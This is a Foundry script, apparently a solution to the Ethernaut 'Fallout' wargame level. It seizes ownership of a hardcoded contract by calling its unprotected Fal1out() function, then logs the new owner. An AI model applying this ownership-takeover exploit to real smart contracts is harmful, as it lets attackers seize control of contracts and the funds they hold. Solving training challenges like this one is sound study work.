// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Level2Script is Script {
    address addr = 0xF8ea935607246Ad605a08A7c00Acbd39B2Bf8DC3;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        console.log(msg.sender, " sender");
        (bool b,) = addr.call(abi.encodeWithSignature("Fal1out()"));
        console.log(b);
        vm.stopBroadcast();
        (bool c, bytes memory returnData) = addr.call(abi.encodeWithSignature("owner()"));
        console.log(c);
        address d = abi.decode(returnData, (address));
        console.log(d);
    }
}
